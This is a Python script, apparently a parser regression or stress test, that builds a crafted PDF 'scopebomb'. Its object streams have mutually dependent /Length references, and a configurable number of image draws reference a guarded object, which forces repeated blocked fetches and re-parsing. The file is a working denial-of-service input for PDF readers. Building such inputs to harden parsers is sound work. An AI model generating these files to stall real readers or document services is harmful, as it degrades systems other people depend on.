# scopebomb, but the object stream's parse is shaped by a blocked fetch on every guarded scope:
#   Y (60, Flate): members 41 (Z's /Length), 90 (/VE array), 91 (STR-byte hex string); /Length 43 0 R
#   Z (50): member 43 (Y's /Length); /Length 41 0 R
# Image geometry's fetch of 90 parses Y, whose /Length needs Z, whose /Length (41, in Y) is blocked
# (Y on the stack): Z falls back to an endstream scan and both parses go to objStrsGuarded, which
# every scope's end drops. N image draws, each /OC a direct OCMD /VE 90 0 R.
import sys, struct, zlib
out_path = sys.argv[1]; N = int(sys.argv[2]); STR = int(sys.argv[3])
content = b"BT /F1 24 Tf 72 700 Td (Record quarter) Tj ET\n" + b"q 10 0 0 10 72 72 cm /Im0 Do Q\n" * N
out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"); off = {}
def put(n, body):
    off[n] = len(out); out.extend(b"%d 0 obj\n" % n + body + b"\nendobj\n")
put(1, b"<< /Type /Catalog /Pages 2 0 R /OCProperties << /OCGs [20 0 R] /D << /Order [20 0 R] >> >> >>")
put(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
put(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> /XObject << /Im0 7 0 R >> >> >>")
cz = zlib.compress(content, 9)
put(4, b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(cz) + cz + b"\nendstream")
put(5, b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
put(7, b"<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 /OC << /Type /OCMD /VE 90 0 R >> /Length 1 >>\nstream\n\x80\nendstream")
put(20, b"<< /Type /OCG /Name (Layer) >>")
def ydata(zlen):
    m41 = (b"%d " % zlen).ljust(12); m90 = b"[/Or 20 0 R] "; m91 = b"<" + b"0" * STR + b">"
    hdr = (b"41 0 90 %d 91 %d " % (len(m41), len(m41) + len(m90))).ljust(32)
    return hdr, zlib.compress(hdr + m41 + m90 + m91, 9)
def zdata(ylen):
    m43 = (b"%d " % ylen).ljust(12); hdr = b"43 0 ".ljust(16)
    return hdr, hdr + m43
yh, yd = ydata(0); zh, zd = zdata(0)
for _ in range(4):
    yh, yd = ydata(len(zd)); zh, zd = zdata(len(yd))
put(50, b"<< /Type /ObjStm /N 1 /First %d /Length 41 0 R >>\nstream\n" % len(zh) + zd + b"\nendstream")
put(60, b"<< /Type /ObjStm /N 3 /First %d /Filter /FlateDecode /Length 43 0 R >>\nstream\n" % len(yh) + yd + b"\nendstream")
xr = len(out)
ents = {0: (0, 0, 255)}
for n in off: ents[n] = (1, off[n], 0)
ents[43] = (2, 50, 0); ents[41] = (2, 60, 0); ents[90] = (2, 60, 1); ents[91] = (2, 60, 2); ents[95] = (1, xr, 0)
size = 96
rows = b"".join(struct.pack(">BIH", *ents.get(i, (0, 0, 0))) for i in range(size))
out += b"95 0 obj\n<< /Type /XRef /Size %d /Root 1 0 R /W [1 4 2] /Length %d >>\nstream\n" % (size, len(rows)) + rows + b"\nendstream\nendobj\n"
out += b"startxref\n%d\n%%%%EOF\n" % xr
open(out_path, "wb").write(out)
